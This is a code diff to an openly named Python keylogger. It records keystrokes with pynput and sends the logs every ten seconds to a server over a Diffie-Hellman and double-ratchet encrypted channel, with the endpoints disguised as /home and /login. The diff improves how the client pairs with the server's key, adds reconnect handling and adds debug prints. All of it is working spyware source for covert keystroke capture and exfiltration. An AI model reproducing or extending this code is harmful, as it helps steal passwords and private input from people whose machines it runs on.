@@ -3,6 +3,7 @@ from pynput import keyboard
 from threading import Timer
 from time import sleep
 import double_ratchet
+from urllib3.exceptions import NewConnectionError
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.backends import default_backend
@@ -15,7 +16,6 @@ import base64
 # constants
 SEND_URL = "/home"
 KEY_URL = "/login"
-SERVER_KEY = "/auth"
 INTERVAL_SEND = 10
 SERVER_IP = "localhost"
 SERVER_PORT = 8000
@@ -32,6 +32,7 @@ class Keylogger:
         self.interval = interval
         self.ip = ip
         self.port = port
+        self.server_key = None
         self.log = ""
         self.__r = double_ratchet.Ratchet()
         self.__start_connection()
@@ -41,13 +42,16 @@ class Keylogger:
         # send public key in Session Header to pair the connection
         key = self.__r.getPublicKey()
         headers = {'Session': base64.b64encode(key)}
-        _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
+        response = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)
+        if 'Location' in response.headers:
+            self.server_key = "/"+response.headers['Location']
 
     def __pair_pkey(self):
         global exchanged_msgs
         # update the public key of the server
         sleep(3)
-        r = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SERVER_KEY)
+        print("pairing pkey")
+        r = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + self.server_key)
         pubkey = bytes(r.text, 'ascii')
         dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
         self.__r.pairComm(dhpub)
@@ -103,6 +107,7 @@ class Keylogger:
         # cada cierto tiempo hay que actualizar mover el ratchet del servidor!!!
 
     def start(self):
+        print("started")
         # listening 2 the user input
         self.__keyboard_listener = keyboard.Listener(on_press=self.__process_pressed_key)
         with self.__keyboard_listener:
@@ -127,7 +132,7 @@ while (True):
         keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT)
         # starting the keyloggger
         keylogger.start()
-    except ConnectionError as e:
+    except (ConnectionError, NewConnectionError) as e:
         print(e)
         sleep(3)
         continue
@@ -135,5 +140,7 @@ while (True):
         keylogger.exit()
         sys.exit(0)
     except Exception as e:
+        print(e)
         if keylogger is not None:
             keylogger.exit()
+        sleep(3)
